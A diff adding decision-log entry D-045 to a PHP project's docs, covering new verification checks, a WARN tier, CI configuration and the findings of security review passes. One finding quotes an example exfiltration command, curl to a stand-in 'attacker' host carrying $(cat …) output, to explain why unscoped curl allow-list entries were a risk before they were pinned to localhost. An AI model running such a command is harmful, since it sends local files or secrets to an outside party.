@@ -439,3 +439,69 @@
   - **The extension-point risk paragraph was missing**, breaking the pattern D-032 and D-041 both follow. Added to the reference doc, and it is worse than "weakenable": a plugin returning `max-age=0` from `security.hsts` does not merely suppress the header, it tells browsers to **forget a previously cached HSTS policy** — a rollback. The same section now states why nothing else is filterable (a CSP filter fails permissive by construction, unlike `admin.gate_map` where omission denies) and names the cost of that choice instead of leaving it implicit.
   - **Recorded and not fixed:** **NEW-26** — `reset-password.php`'s set-password form has no CSRF field or check. Pre-existing, exploitability genuinely low (a forged POST still needs the valid `user_id` + `token` pair, which is the secret CSRF would be substituting for), and it belongs to the authentication slice under D-031's narrowing. Noted because the file was in the diff and a reviewer looked at it; leaving it unrecorded would make the next reader find it again.
   - Confirmed sound by both reviewers against source, not merely read: the ordering (headers precede every emitting path below them), the nonce integrity (CSPRNG, one per request, no path where header and markup could diverge), the fail-closed CSP breaking no admin inline script, and the deliberate refusal to trust `X-Forwarded-Proto`.
+
+## D-045 — keel-verify gains six checks and a WARN tier; two release-packaging defects are made detectable, not fixed
+- Date / phase: 2026-07-20 / Phase 5, Sprint 1 slice 9 (the INDEX scope, the WARN treatment, the CI matrix and the i18n check were all user decisions)
+- Decision: `scripts/keel-verify` grows from 2 checks to **9**, covering the Phase 5 §1a promises that apply to this project. `docs/api/INDEX.md` gets a **verifier, not a regenerator**. A new **WARN** tier reports a genuinely-broken property whose fix is owned by another phase, printing full evidence without changing the exit code. `.github/workflows/ci.yml` runs the same commands the test points run, on PHP 8.2 and 8.3, with a syntax-only 8.1 job. All four permission allow-lists are written. `scripts/` enters the phpcs scan set with a fresh 0/2 baseline.
+- **Why a verifier and not a regenerator (user decision).** INDEX.md was produced at adoption by bespoke mechanical extraction across 949 surfaces and has been hand-edited by every slice since. A regenerator that mis-extracts would *silently rewrite a correct file*, and the verifier would then pass because it agrees with the regenerator rather than with reality — a guard validating itself, which is L-010's failure mode with extra machinery. The verifier is cheap, fires only on real drift, and was green at birth for a **measured** reason: the eight Summary counts match their section row counts exactly (145/97/306/116/206/34/26/19, total 949).
+- **Why two checks WARN instead of FAIL.** `docs/sprints/sprint-1.md` scopes H-01 (version touchpoints in four-way disagreement) to Phase 7 and this slice to making it *detectable*. A hard FAIL would turn keel-verify red for the whole sprint close and for every CI run, which trains people to ignore it — the exact mechanism that lets a check go inert. The WARN prints all five touchpoint values on every run. **The same treatment was extended to NEW-27** for consistency: the property is broken, the fix is Phase 7's, the evidence prints every time.
+- **The placeholder check's scope is `git check-attr export-ignore`, not a hand-written list** — the same authority that builds the release archive. That choice is what surfaced NEW-27, and it is also why the check is precise: bare `TODO` and `PLACEHOLDER` are deliberately NOT matched, because `install.php` ships Spanish copy where "TODO" means *all* and a CSS section header reads "CHART PLACEHOLDER". A check that cries wolf on correct content gets ignored, which is the failure this whole slice exists to prevent. Green at birth across **448** distributable files, recounted independently.
+- **The i18n check is the invariant that actually exists here (user decision).** §1a names WordPress i18n sniffs, which are N/A per D-006. The real invariant is catalogue key parity, and it is not theoretical: slices 7 and 8 both added keys to all 20 catalogues **by hand**. Green at birth across **120 files in 6 sets** (core + 5 plugins), proven by injecting both a missing key and an extra one.
+- **Minified-asset sync is deliberately NOT built** — D-038, not re-opened. All 68 tracked `*.min.*` are third-party vendor distributions and Klytos ships no minified first-party asset, so the drift the check exists to detect cannot occur. Its absence is stated in the script's own header so it reads as a decision rather than an oversight.
+- **CI seeds the playground, and that is load-bearing rather than convenience.** 91 of 138 tests are the integration tier, which SKIPS rather than fails without a playground (proven in slice 1). Un-seeded CI would run 34% of the suite and report green, omitting every authorization refusal test — the subject of the entire sprint. A skip is therefore promoted to a hard CI failure. **D-027's consequence is stated rather than papered over**: PHPUnit 11 needs PHP 8.2+ while Klytos declares 8.1+, so the suite cannot run on the declared floor; 8.1 gets a syntax-only job, honestly labelled.
+- **The changelog check does not guess a convention.** With one entry there is nothing to order, so it reports that explicitly instead of passing silently. Klytos has not established whether its changelog grows oldest-first (Keel §1a) or newest-first (the ecosystem norm); the second entry is when that gets decided, by a person.
+- Every one of the six new checks was **proven to FAIL on an injected violation and pass once reverted** — ten probes, all fired, tree left clean — and the two WARNs were proven to go **quiet** when their condition is fixed, because one direction is half a test (L-010). Pinned permanently by `tests/Unit/KeelVerifyTest.php`, itself proven in three directions.
+- Alternatives rejected (and why): **regenerator + verifier** (correct end state if INDEX ever outgrows hand-editing, but it is a large bespoke extractor whose silent failure mode is worse than the drift it prevents); **hard FAIL on the version touchpoints** (strongest gate, but it either blocks the sprint close or forces a version-number decision that Phase 7 owns and that needs the user's explicit approval); **a recorded baseline for the touchpoints** (the D-025 pattern, and rejected here because freezing a broken invariant normalises it — a baseline is right for 193 pre-existing lint violations, wrong for four values that must be one value); **CI on 8.2/8.3 only** (simplest, leaves the declared floor verified by nothing); **raising the support floor to 8.2** (clean, but it is a support-matrix change for a released product with an installed base and belongs in its own decision, D-027's trigger).
+- Supersedes: none. Extends the `scripts/keel-verify` created by **D-032**. Opens **NEW-27** and **NEW-28**; makes **H-01** detectable without fixing it.
+- **Amended after the slice's own review cycle, before commit.** Both review subagents plus a
+  `docs-verifier` and a fresh-context playground-QA pass ran on the finished diff (docs included, per
+  L-015). Recorded here rather than folded in silently, because the shape of what they caught is the
+  transferable part — and because two of the findings are the slice's own subject turned on itself:
+  - **The `security-auditor` returned a BLOCKING finding, and it was mine.** `.claude/settings.json`
+    and `.cursor/cli.json` allowed `Bash(curl -D -:*)` and `Bash(curl -s -o /dev/null:*)` **unscoped
+    to any host**, while the sibling entries three lines above pinned `php -S` and `nc` to
+    `127.0.0.1`. A committed allow-list is a grant to run **without a confirmation prompt**, in a
+    **public repo with forks**, so this is an exfiltration and SSRF primitive
+    (`curl -s -o /dev/null "https://attacker/?d=$(cat …)"` matches the prefix). Written into the
+    config of the project that spent slice 6 building an SSRF control. Both entries are now pinned to
+    `http://127.0.0.1`. `.codex` and `.gemini` omit curl entirely and were unaffected.
+  - **A check that scanned nothing reported PASS**, which is precisely what this slice exists to
+    prevent. If `git check-attr` returned nothing, `$distributable` stayed empty and the placeholder
+    check printed `PASS … (0 files)` — indistinguishable from "nothing to flag" — while its sibling
+    `keel_git()` already SKIPped loudly for the same cause. It now FAILs with *"it has not passed —
+    it did not run"*, proven by forcing the call to fail.
+  - **The `proc_open` stdin/stdout write-then-read pattern would HANG, not fail**, once the candidate
+    list outgrows the OS pipe buffer. At 448 files it is comfortably under; the failure mode arrives
+    silently with repository growth. Replaced with a temp file.
+  - **The guard added earlier in this same slice was bypassable by changing one letter.**
+    `str_ends_with( $_SERVER['SCRIPT_NAME'], '/scripts/dev/router.php' )` is case-sensitive, and on
+    the case-insensitive filesystems where the playground actually runs (macOS, Windows)
+    `/scripts/dev/Router.php` served the file and MISSED the guard — verified by probe. Now
+    lowercased and percent-decoded. Both reviewers found this independently; the security pass also
+    established it is **not exploitable** (condition 1 blocks every production SAPI, and the rest of
+    the file is an allow-list keyed to `/installer/`), so it is defence in depth, not a hole.
+  - **CI was about to publish a live credential.** `seed-playground.php:327` echoes the freshly-minted
+    MCP application password, and a GitHub Actions log on a public repo is world-readable and
+    retained after the runner is destroyed. Not practically exploitable (the credential only
+    authenticates against that job's own ephemeral storage and nothing in the workflow listens on a
+    port) — and redirected anyway, because "unreachable" is a weaker guarantee than "not logged".
+  - **My own comments claimed the four allow-lists were the "same command set". They are not** — the
+    Codex and Cursor lists are genuinely narrower. The L-002 defect, in text written to prevent it,
+    for the second slice running (L-015 was the same shape). Corrected to say *narrower, deliberately*.
+  - **`KeelVerifyTest` demands 9 checks while the script documents a 7-check no-git path** — two files
+    from one slice giving contradictory guarantees. Resolved in favour of requiring git, stated in the
+    test rather than left implicit.
+  - **The fresh-context playground-QA pass failed the document on operational sequencing**, and every
+    fix landed before the close: the port was hardcoded 19 times with no substitution mechanism (now
+    `$KPORT`); following section 1 leaves a server that makes the suite **error**; following section 4
+    stores a comment that makes the suite **fail**, beside a paragraph promising no reseed is needed;
+    section 5 probed the wrong port; and the seeder printed *"Log in as any of: owner / admin /
+    editor / viewer"*, which NEW-11 makes false. Its verdict on the product half is worth recording:
+    every product claim it checked was true to the digit — 177 tools, 26 commands, 5 CVEs, the full
+    403/401/302 matrix, the honeypot semantics.
+  - Confirmed sound against source by the security pass, not merely read: `upgrade-assert.php`'s and
+    `seed-playground.php`'s `'cli'` guards (no HTTP-serving SAPI is ever literally `cli`);
+    `composer.json` has no install hooks, so `composer install` cannot transitively reach
+    `install.php` or `cli.php build`; `upgrade-test.sh` never touches the working checkout; and
+    `ci.yml` has minimal `permissions`, no secrets, plain `pull_request` (not `pull_request_target`),
+    and no interpolation of `github.*` context into any shell block.
